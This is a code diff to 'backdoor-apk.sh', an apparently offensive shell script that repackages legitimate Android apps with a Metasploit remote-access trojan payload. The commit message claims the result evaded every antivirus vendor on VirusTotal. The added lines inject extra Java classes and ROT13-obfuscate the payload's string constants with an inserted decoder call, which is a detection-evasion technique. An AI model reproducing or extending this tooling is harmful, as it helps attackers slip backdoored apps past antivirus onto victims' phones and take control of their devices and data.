First time repackaged APK evaded all mobile antivirus vendors on virustotal

+++ backdoor-apk/backdoor-apk.sh
@@ -157,6 +157,15 @@ if [ $rc != 0 ]; then
   cleanup
   exit $rc
 fi
+# inject Java classes
+cp -R $MY_PATH/java/classes/* $MY_PATH/libs/ >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc != 0 ]; then
+  echo "done."
+  echo "[!] Failed to inject Java classes"
+  cleanup
+  exit $rc
+fi
 cd $MY_PATH/bin/classes && jar xvf Rat-dex2jar.jar >>$LOG_FILE 2>&1
 cd $MY_PATH
 rm $MY_PATH/bin/classes/*.apk $MY_PATH/bin/classes/*.jar >>$LOG_FILE 2>&1
@@ -215,7 +224,7 @@ echo -n "[*] Copying RAT smali files to new directories in original project..."
 cp -v $MY_PATH/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  cp -v $MY_PATH/payload/smali/net/dirtybox/util/{a.smali,b.smali,c.smali} $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
+  cp -v $MY_PATH/payload/smali/net/dirtybox/util/{a.smali,b.smali,c.smali,d.smali} $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
   rc=$?
 fi
 echo "done."
@@ -233,8 +242,58 @@ if [ $rc == 0 ]; then
   rc=$?
 fi
 if [ $rc == 0 ]; then
-  sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali,AppBoot.smali} >>$LOG_FILE 2>&1
+  sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali,d.smali,AppBoot.smali} >>$LOG_FILE 2>&1
   rc=$?
+fi
+# obfuscate const-string values in smali files
+cat >$MY_PATH/obfuscate.method <<EOL
+
+    invoke-static {###REG###}, L###CLASS###;->a(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object ###REG###
+EOL
+if [ $rc == 0 ]; then
+  sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} >>$LOG_FILE 2>&1
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  grep "const-string" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} |while read -r line; do
+    file=`echo $line |awk -F ": " '{ print $1 }'`
+    echo "File: $file" >>$LOG_FILE 2>&1
+    target=`echo $line |awk -F ", " '{ print $2 }'`
+    echo "Target: $target" >>$LOG_FILE 2>&1
+    tmp=`echo $line |awk -F ": " '{ print $2 }'`
+    reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
+    echo "Reg: $reg" >>$LOG_FILE 2>&1
+    replacement=`echo $target |tr '[A-Za-z]' '[N-ZA-Mn-za-m]'`
+    echo "Replacement: $replacement" >>$LOG_FILE 2>&1
+    sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
+    rc=$?
+    if [ $rc != 0 ]; then
+      touch $MY_PATH/fixing.error
+      break
+    fi
+    sed -i '\|'"$replacement"'|r '"$MY_PATH"'/obfuscate.method' $file >>$LOG_FILE 2>&1
+    rc=$?
+    if [ $rc != 0 ]; then
+      touch $MY_PATH/fixing.error
+      break
+    fi
+    sed -i 's/###REG###/'"$reg"'/' $file >>$LOG_FILE 2>&1
+    rc=$?
+    if [ $rc != 0 ]; then
+      touch $MY_PATH/fixing.error
+      break
+    fi
+  done
+  if [ ! -f $MY_PATH/fixing.error ]; then
+    class="$payload_tld/$payload_primary_dir/$payload_sub_dir/d"
+    sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali}
+    rc=$?
+  else
+    rm -v $MY_PATH/fixing.error >>$LOG_FILE 2>&1
+    rc=1
+  fi
 fi
 echo "done."
 if [ $rc != 0 ]; then
